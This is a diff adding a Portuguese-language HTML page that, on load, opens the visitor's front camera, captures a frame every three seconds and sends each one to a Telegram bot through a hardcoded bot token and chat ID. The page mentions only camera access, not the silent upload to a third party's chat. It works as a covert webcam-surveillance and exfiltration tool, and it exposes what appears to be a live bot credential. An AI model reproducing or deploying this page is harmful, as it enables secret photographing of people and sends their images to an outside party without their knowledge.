@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Acessar Câmera e Tirar Fotos</title>
+</head>
+<body>
+    <h1>Acessando a câmera...</h1>
+    <video id="camera-stream" width="640" height="480" autoplay></video>
+    <canvas id="camera-canvas" width="640" height="480" style="display: none;"></canvas>
+
+    <script>
+        const video = document.getElementById('camera-stream');
+        const canvas = document.getElementById('camera-canvas');
+        const context = canvas.getContext('2d');
+        const botToken = '7039889991:AAEcoAkuppMt6JvzpJUhSkcXUOUQu1pKnrk';
+        const chatId = '5156117895';
+        const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+                capturePhotos();
+            } catch (error) {
+                console.error('Erro ao acessar a câmera:', error);
+            }
+        }
+
+        function capturePhotos() {
+            setInterval(() => {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+                sendPhotoToTelegram(imageData);
+            }, 3000); // Captura uma foto a cada 3 segundos
+        }
+
+        function sendPhotoToTelegram(imageData) {
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    photo: imageData
+                })
+            }).then(response => response.json())
+              .then(data => {
+                  if (data.ok) {
+                      console.log('Foto enviada com sucesso!');
+                  } else {
+                      console.error('Erro ao enviar foto:', data);
+                  }
+              }).catch(error => {
+                  console.error('Erro ao enviar foto:', error);
+              });
+        }
+
+        // Inicia a câmera automaticamente quando a página é carregada
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
+
+         
